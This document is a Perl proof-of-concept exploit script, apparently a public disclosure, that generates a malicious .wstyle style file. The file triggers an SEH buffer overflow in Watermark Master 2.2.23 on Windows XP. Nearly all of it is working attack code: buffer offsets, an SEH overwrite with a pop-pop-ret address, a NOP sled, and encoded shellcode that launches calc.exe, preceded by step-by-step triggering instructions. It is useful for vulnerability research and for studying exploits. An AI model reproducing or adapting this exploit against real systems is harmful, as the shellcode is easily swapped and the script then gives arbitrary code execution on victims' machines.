#!/usr/bin/perl
 
#########################################################################################
# Exploit Title: Watermark Master v2.2.23 .wstyle Buffer Overflow (SEH)
# Date: 10-28-2013
# Exploit Author: Mike Czumak (T_v3rn1x) -- @SecuritySift
# Vulnerable Software: Watermark Master v2.2.23
# Software Link: 
http://www.videocharge.com/download/WatermarkMaster_Install.exe
# Version: 2.2.23
# Tested On: Windows XP SP3
#########################################################################################
# Timeline:
# - Oct 28: Vuln discovered, vendor alerted and acknowledged receipt of 
bug submission
# - Oct 29: Requested fix timeline from vendor for public disclosure
# - Nov 1:  Similar exploit publicaly released for same version of 
software
#   -- http://www.exploit-db.com/exploits/29327/
# - Nov 3:  No response from vendor, follow-up email sent
# - Nov 14: No response from vendor, public disclosure
#########################################################################################
# Creates a malicious Style file (.wstyle)
#
# To exploit:
# 1) Place sploit.wstyle file in Video Styles folder
#       ..\Videocharge Software\Watermark Master\Styles\Video
# 2) Launch Watermark Master application, add an image and apply the 
style
#       WaterMark --> Add --> Image (can also add text, rectangle, etc)
#       WaterMark --> Apply Style... --> sploit
# 3) Save (Ctrl+s) -- Application will crash, launching the exploit
#########################################################################################
 
my $buffsize = 15000; # sets buffer size for consistent sized payload
 
my $xmlstart = '<?xml version="1.0" encoding="Windows-1251" ?> <cols 
name="'; # build the start of the xml file
 
# nseh is at offset 512, followed by 9484 bytes of available data
my $junk = "\x41" x (512 - $xmlstart);
my $nseh = "\xeb\x08\x90\x90"; # overwrite next seh with jmp instruction 
(8 bytes)
my $seh = pack('V',0x72D11F39); # overwrite seh w/ pop edi pop esi ret
                # ASLR: False, Rebase: False, SafeSEH: False, OS: True
                # (C:\WINDOWS\system32\msacm32.drv) (no suitable app 
modules found)
my $nops = "\x90" x 20;
 
# Alpha-numeric encoding used for xml-based Calc.exe payload
# msfpayload windows/exec EXITFUNC=seh CMD=calc.exe R |
# msfencode -e x86/alpha_upper -b '\x00\xac\xff\xca'
# size 469
 
my $shell = "\x89\xe6\xd9\xeb\xd9\x76\xf4\x5b\x53\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b" .
"\x58\x4d\x59\x35\x50\x33\x30\x45\x50\x35\x30\x4c\x49\x4b" .
"\x55\x46\x51\x48\x52\x42\x44\x4c\x4b\x50\x52\x36\x50\x4c" .
"\x4b\x30\x52\x54\x4c\x4c\x4b\x46\x32\x42\x34\x4c\x4b\x34" .
"\x32\x57\x58\x44\x4f\x58\x37\x50\x4a\x56\x46\x36\x51\x4b" .
"\x4f\x50\x31\x59\x50\x4e\x4c\x37\x4c\x53\x51\x53\x4c\x44" .
"\x42\x46\x4c\x37\x50\x49\x51\x58\x4f\x44\x4d\x33\x31\x58" .
"\x47\x4a\x42\x5a\x50\x31\x42\x30\x57\x4c\x4b\x50\x52\x54" .
"\x50\x4c\x4b\x57\x32\x47\x4c\x55\x51\x38\x50\x4c\x4b\x31" .
"\x50\x34\x38\x4b\x35\x4f\x30\x43\x44\x51\x5a\x45\x51\x38" .
"\x50\x36\x30\x4c\x4b\x30\x48\x34\x58\x4c\x4b\x36\x38\x51" .
"\x30\x33\x31\x59\x43\x4b\x53\x57\x4c\x51\x59\x4c\x4b\x46" .
"\x54\x4c\x4b\x45\x51\x39\x46\x46\x51\x4b\x4f\x50\x31\x59" .
"\x50\x4e\x4c\x4f\x31\x48\x4f\x34\x4d\x55\x51\x58\x47\x56" .
"\x58\x4d\x30\x33\x45\x4c\x34\x54\x43\x53\x4d\x5a\x58\x47" .
"\x4b\x33\x4d\x31\x34\x33\x45\x4b\x52\x46\x38\x4c\x4b\x31" .
"\x48\x31\x34\x35\x51\x4e\x33\x55\x36\x4c\x4b\x44\x4c\x50" .
"\x4b\x4c\x4b\x56\x38\x35\x4c\x43\x31\x59\x43\x4c\x4b\x45" .
"\x54\x4c\x4b\x35\x51\x58\x50\x4c\x49\x31\x54\x57\x54\x37" .
"\x54\x51\x4b\x51\x4b\x43\x51\x50\x59\x51\x4a\x36\x31\x4b" .
"\x4f\x4d\x30\x30\x58\x31\x4f\x50\x5a\x4c\x4b\x35\x42\x5a" .
"\x4b\x4c\x46\x31\x4d\x53\x5a\x45\x51\x4c\x4d\x4d\x55\x4e" .
"\x59\x33\x30\x45\x50\x53\x30\x50\x50\x32\x48\x56\x51\x4c" .
"\x4b\x52\x4f\x4d\x57\x4b\x4f\x59\x45\x4f\x4b\x4b\x4e\x54" .
"\x4e\x57\x42\x5a\x4a\x33\x58\x4f\x56\x4d\x45\x4f\x4d\x4d" .
"\x4d\x4b\x4f\x38\x55\x57\x4c\x54\x46\x53\x4c\x34\x4a\x4b" .
"\x30\x4b\x4b\x4b\x50\x52\x55\x34\x45\x4f\x4b\x57\x37\x32" .
"\x33\x33\x42\x52\x4f\x52\x4a\x43\x30\x51\x43\x4b\x4f\x39" .
"\x45\x45\x33\x35\x31\x42\x4c\x33\x53\x46\x4e\x32\x45\x34" .
"\x38\x53\x55\x53\x30\x41\x41";
 
my $xmlend = '" clsid="blah"> </cols>'; # build the rest of the xml file
 
my $sploit = $junk.$nseh.$seh.$nops.$shell; # build sploit portion of 
buffer
my $fill = "\x43" x ($buffsize - 
(length($xmlstart)+length($sploit)+length($xmlend))); # fill remainder 
of buffer with junk for consistent size
my $buffer = $xmlstart.$sploit.$fill.$xmlend; # build final buffer
 
# write the exploit buffer to file
my $file = "sploit.wstyle";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer) . "\n"; 
